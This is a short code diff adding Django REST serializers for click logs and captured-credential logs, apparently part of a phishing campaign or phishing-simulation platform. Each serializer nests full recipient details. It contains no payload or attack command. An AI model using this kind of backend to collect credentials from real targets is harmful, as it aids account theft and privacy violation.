@@ -1,5 +1,5 @@
 from rest_framework import serializers
-from .models import Sender, RecipientGroup, Recipient, Message
+from .models import Sender, RecipientGroup, Recipient, Message, ClickLog, CredentialLog
 
 class SenderSerializer(serializers.ModelSerializer):
     class Meta:
@@ -32,6 +32,20 @@ class MessageSerializer(serializers.ModelSerializer):
     class Meta:
         model = Message
         fields = ['id', 'sender', 'recipient_group', 'subject', 'body', 'link', 'sent_at']
+
+class ClickLogSerializer(serializers.ModelSerializer):
+    recipient = RecipientSerializer()  # Загружаем полные данные получателя
+
+    class Meta:
+        model = ClickLog
+        fields = '__all__'
+
+class CredentialLogSerializer(serializers.ModelSerializer):
+    recipient = RecipientSerializer()  # Загружаем полные данные получателя
+
+    class Meta:
+        model = CredentialLog
+        fields = '__all__'
 
 
 
